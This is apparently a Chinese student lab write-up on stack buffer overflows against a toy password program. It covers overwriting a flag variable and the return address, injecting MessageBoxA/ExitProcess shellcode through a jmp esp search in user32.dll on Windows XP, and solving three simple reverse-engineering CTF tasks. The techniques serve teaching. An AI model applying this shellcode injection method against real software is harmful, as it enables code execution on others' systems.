![Mqgxu8.png](https://s2.ax1x.com/2019/11/23/Mqgxu8.png)

authenticated的值是1

输入8个q

没有执行前，authenticated的值还是1

![Mq2JKK.png](https://s2.ax1x.com/2019/11/23/Mq2JKK.png)

执行以后，值被覆盖为0

![Mq2UVe.png](https://s2.ax1x.com/2019/11/23/Mq2UVe.png)

## overflow(2):

将跳转地址覆盖为验证通过的地址

![Mq2qZF.png](https://s2.ax1x.com/2019/11/23/Mq2qZF.png)

用ultraedit编辑password文件，任意填充8字符覆盖password，4字符覆盖authenticated，4字符覆盖上一栈帧的ebp,填入4个字符返回地址。

![MqRldg.png](https://s2.ax1x.com/2019/11/23/MqRldg.png)

再运行程序

![MqRweU.png](https://s2.ax1x.com/2019/11/23/MqRweU.png)

## overflow(3):

程序与2的区别是增加了头文件windows.h，buff由8字节变成44字节，有足够空间填入代码。

找到buff地址和返回地址

![MLYJ5F.png](https://s2.ax1x.com/2019/11/24/MLYJ5F.png)

找到messageboxA入口地址

```c++
#include <stdio.h>
#include <windows.h>
 
typedef void (*FuncPointer)(LPTSTR);  // 函数指针  
 
int main()
{   
    HINSTANCE LibHandle;
    FuncPointer GetAddr;
    // 加载成功后返回库模块的句柄 
    LibHandle = LoadLibrary("user32");  
    printf("user32 LibHandle = 0x%X\n", LibHandle);
    // 返回动态链接库(DLL)中的输出库函数地址
    GetAddr=(FuncPointer)GetProcAddress(LibHandle,"MessageBoxA");   
    printf("MessageBoxA = 0x%X\n", GetAddr);
    return 0;
}
```

![MLt0zj.png](https://s2.ax1x.com/2019/11/24/MLt0zj.png)

构造password

| 机器码     | 汇编指令           | 解释                |
| ---------- | ------------------ | ------------------- |
| 33DB       | XOR EBX,EBX        | 将EBX寄存器置为NULL |
| 53         | PUSH EBX           |                     |
| 686A6F6B65 | PUSH 656b6f6a      | Thisjoke            |
| 6854686973 | PUSH 73696854      |                     |
| 8BC4       | MOV EAX,ESP        | EAX里存入字符串指针 |
| 53         | PUSH EBX           |                     |
| 50         | PUSH EAX           |                     |
| 50         | PUSH EAX           |                     |
| 53         | PUSH EBX           |                     |
| B8301D3148 | MOV EAX,0x48311D30 | 调用MessageBoxA     |
| FFD0       | CALL EAX           |                     |

![MLLowj.png](https://s2.ax1x.com/2019/11/24/MLLowj.png)

由于win10保护机制太强，没有办法显示messagebox

换到xp系统上实现

先找到messageboxA的入口地址

![MLOene.png](https://s2.ax1x.com/2019/11/24/MLOene.png)

再找到buff起始地址

![MLO8c8.png](https://s2.ax1x.com/2019/11/24/MLO8c8.png)

![MLON7j.png](https://s2.ax1x.com/2019/11/24/MLON7j.png)

![MLOsjU.png](https://s2.ax1x.com/2019/11/24/MLOsjU.png)

定位shellcode，找jmp esp指令

```c++
#include <windows.h>
#include <stdio.h>
#define DLL_NAME "user32.dll"
main()
{
    BYTE* ptr;
    int position,address;
    HINSTANCE handle;
    BOOL done_flag = FALSE;
    handle=LoadLibrary(DLL_NAME);
    if(!handle)
    {
        printf(" load dll erro !");
        exit(0);
    }

    ptr = (BYTE*)handle;

    for(position = 0; !done_flag; position++)
    {
        try
        {
            if(ptr[position] == 0xFF && ptr[position+1] == 0xE4)
            {
                //0xFFE4 is the opcode of jmp esp
                int address = (int)ptr + position;
                printf("OPCODE found at 0x%x\n",address);
            }
        }
        catch(...)
        {
            int address = (int)ptr + position;
            printf("END OF 0x%x\n", address);
            done_flag = true;
        }
    }
}
```

![MLzBOf.png](https://s2.ax1x.com/2019/11/24/MLzBOf.png)

定位exitprocess入口地址

```c++
#include <stdio.h>
#include <windows.h>
 
typedef void (*FuncPointer)(LPTSTR);  // 函数指针  
 
int main()
{   
    HINSTANCE LibHandle;
    FuncPointer GetAddr;
    // 加载成功后返回库模块的句柄 
    LibHandle = LoadLibrary("kernel32");  
    printf("kernel32 LibHandle = 0x%X\n", LibHandle);
    // 返回动态链接库(DLL)中的输出库函数地址
    GetAddr=(FuncPointer)GetProcAddress(LibHandle,"ExitProcess");   
    printf("ExitProcess = 0x%X\n", GetAddr);
    return 0;
}
```

![MLzqh9.png](https://s2.ax1x.com/2019/11/24/MLzqh9.png)

修改password文件

| 机器码     | 汇编指令           | 解释                |
| ---------- | ------------------ | ------------------- |
| 33DB       | XOR EBX,EBX        | 将EBX寄存器置为NULL |
| 53         | PUSH EBX           |                     |
| 686A6F6B65 | PUSH 656b6f6a      | Thisjoke            |
| 6854686973 | PUSH 73696854      |                     |
| 8BC4       | MOV EAX,ESP        | EAX里存入字符串指针 |
| 53         | PUSH EBX           |                     |
| 50         | PUSH EAX           |                     |
| 50         | PUSH EAX           |                     |
| 53         | PUSH EBX           |                     |
| B8EA07D577 | MOV EAX,0x77D507EA | 调用MessageBoxA     |
| FFD0       | CALL EAX           |                     |
| 53         | PUSH EBX           |                     |
| B8A2BF817C | MOV EAX,0x7C81BFA2 | 调用exit（0）       |
| FFD0       | CALL EAX           |                     |

![MOC6uq.png](https://s2.ax1x.com/2019/11/24/MOC6uq.png)

现在程序就可以正常退出

![MOC58J.png](https://s2.ax1x.com/2019/11/24/MOC58J.png)

## 选做题：

### hello world

判断v12是否是314159265，是的话直接打印flag

![QMp4Qf.png](https://s2.ax1x.com/2019/12/03/QMp4Qf.png)

![QMp7wQ.png](https://s2.ax1x.com/2019/12/03/QMp7wQ.png)

### Simple

![QM9kf1.png](https://s2.ax1x.com/2019/12/03/QM9kf1.png)

将给的字符串ord-1就出flag

![QM9eOO.png](https://s2.ax1x.com/2019/12/03/QM9eOO.png)

### Passthis

这里是他的关键逻辑，v6是我们输入的值，在循环里面，与给的量进行了，异或，然后得出flag

![QM91fI.png](https://s2.ax1x.com/2019/12/03/QM91fI.png)

0xC1,0x0CB,0x0C6,0x0C0,0x0FC,0x0C9,0x0E8,0x0AB,0x0A7,0x0DE,0x0E8,0x0F2,0x0A7,0x0F4,0x0EF,0x0E8,0x0F2,0x0EB,0x0E3,0x0A7,0x0E9,0x0E8,0x0F3,0x0A7,0x0F7,0x0E6,0x0F4,0x0F4,0x0A7,0x0F3,0x0EF,0x0E2,0x0A7,0x0E1,0x0EB,0x0E6,0x0E0,0x0FA

![QM9J6f.png](https://s2.ax1x.com/2019/12/03/QM9J6f.png)